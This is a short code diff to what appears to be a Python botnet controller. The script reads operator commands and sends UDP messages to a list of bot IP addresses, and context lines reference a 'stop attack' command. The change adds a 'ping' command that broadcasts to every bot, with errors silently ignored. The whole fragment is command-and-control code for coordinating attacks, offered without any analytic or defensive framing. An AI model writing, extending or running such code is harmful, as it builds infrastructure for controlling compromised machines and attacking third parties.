@@ -23,6 +23,13 @@ for line in sys.stdin:
                 sock.sendto(MESSAGE, (str(ip), BOT_PORT))
             except:
                 pass
+    elif "ping" in command:
+        MESSAGE = b"ping"
+        for ip in ips:
+            try:
+                sock.sendto(MESSAGE, (str(ip), BOT_PORT))
+            except:
+                pass
     elif command == "stop attack":
         MESSAGE = b"stop"
         for ip in ips:
